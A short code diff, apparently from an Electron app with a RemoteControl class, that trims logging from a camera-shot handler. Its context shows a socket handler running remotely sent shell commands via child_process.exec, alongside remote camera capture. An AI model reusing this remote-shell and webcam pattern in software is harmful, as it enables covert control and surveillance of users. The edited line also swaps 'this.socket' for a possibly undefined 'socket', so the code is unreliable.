@@ -7,8 +7,6 @@ const child_process = require("child_process");
 // My Modules
 const info = require("./config");
 
-
-
 class RemoteControl {
   constructor() {
     this.mainWindow;
@@ -62,12 +60,8 @@ class RemoteControl {
     });
 
     ipcMain.on("cam", (event, args) => {
-        console.log("cam event:");
-        console.log({args});
-    
-          this.socket.emit("camShotResponse", args);
-       
-      });
+      socket.emit("camShotResponse", args);
+    });
 
     this.socket.on("getRunRequest", (data) => {
       child_process.exec(data.cmd, { shell: true }, (err, stdout, stderr) => {
